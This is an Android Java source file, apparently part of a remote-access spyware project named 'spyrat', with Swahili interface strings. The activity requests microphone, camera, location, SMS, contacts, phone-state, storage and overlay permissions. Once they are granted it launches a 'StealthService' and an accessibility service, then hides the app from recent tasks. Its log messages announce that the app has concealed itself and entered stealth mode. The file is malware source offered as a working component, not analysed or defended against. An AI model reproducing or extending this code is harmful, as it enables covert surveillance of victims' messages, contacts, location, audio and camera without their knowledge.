package com.spyrat.investigation;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;

public class PermissionActivity extends Activity {
    private static final String TAG = "SpyratPermissions";
    private Button grantPermissionsButton;
    private ProgressBar progressBar;
    private TextView statusText;
    private SharedPreferences prefs;
    
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQUEST = 1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make activity fullscreen and secure
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                            WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                            WindowManager.LayoutParams.FLAG_SECURE);
        
        setContentView(R.layout.activity_permission);
        
        prefs = getSharedPreferences("spyrat_config", MODE_PRIVATE);
        initializeViews();
        checkCurrentPermissions();
    }

    private void initializeViews() {
        grantPermissionsButton = findViewById(R.id.grant_permissions_button);
        progressBar = findViewById(R.id.progress_bar);
        statusText = findViewById(R.id.status_text);
        
        grantPermissionsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
    }

    private void checkCurrentPermissions() {
        if (hasAllPermissions()) {
            statusText.setText("✅ Permissions zote zimekubaliwa");
            proceedToStealthMode();
        } else {
            statusText.setText("📋 Tafadhali kubali permissions zote");
        }
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return hasOverlayPermission();
    }

    private boolean hasOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(this);
        }
        return true;
    }

    private void requestAllPermissions() {
        showLoading(true);
        statusText.setText("📋 Inauliza permissions...");
        
        // Request overlay permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasOverlayPermission()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
            return;
        }
        
        // Request other permissions
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted && hasOverlayPermission()) {
                statusText.setText("✅ Permissions zote zimekubaliwa!");
                showToast("✅ Permissions zimekubaliwa, kuanza stealth mode...");
                proceedToStealthMode();
            } else {
                statusText.setText("❒ Baadhi ya permissions hazijakubaliwa");
                showToast("⚠️ Lazima ukubali permissions zote kwa ajili ya kazi");
                showLoading(false);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
            if (hasOverlayPermission()) {
                // Continue with other permissions
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
            } else {
                statusText.setText("❒ Overlay permission haijakubaliwa");
                showToast("⚠️ Lazima ukubali overlay permission");
                showLoading(false);
            }
        }
    }

    private void proceedToStealthMode() {
        showLoading(true);
        statusText.setText("🚀 Inaanzisha stealth mode...");
        
        // Save that permissions are granted
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean("permissions_granted", true);
        editor.apply();
        
        // Delay before starting stealth mode
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                startStealthService();
                hideAppAndFinish();
            }
        }, 2000);
    }

    private void startStealthService() {
        try {
            Intent serviceIntent = new Intent(this, StealthService.class);
            startService(serviceIntent);
            Log.d(TAG, "🚀 StealthService imeanzishwa");
            
            // Start accessibility service if available
            Intent accessibilityIntent = new Intent(this, MyAccessibilityService.class);
            startService(accessibilityIntent);
            Log.d(TAG, "♿ AccessibilityService imeanzishwa");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting services: " + e.getMessage());
        }
    }

    private void hideAppAndFinish() {
        // Hide the app from recent apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
        
        // Move task to back
        moveTaskToBack(true);
        
        Log.d(TAG, "👻 App imejificha, stealth mode imeanzishwa");
    }

    private void showLoading(boolean show) {
        progressBar.setVisibility(show ? View.VISIBLE : View.GONE);
        grantPermissionsButton.setEnabled(!show);
    }

    private void showToast(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(PermissionActivity.this, message, Toast.LENGTH_LONG).show();
            }
        });
    }
}
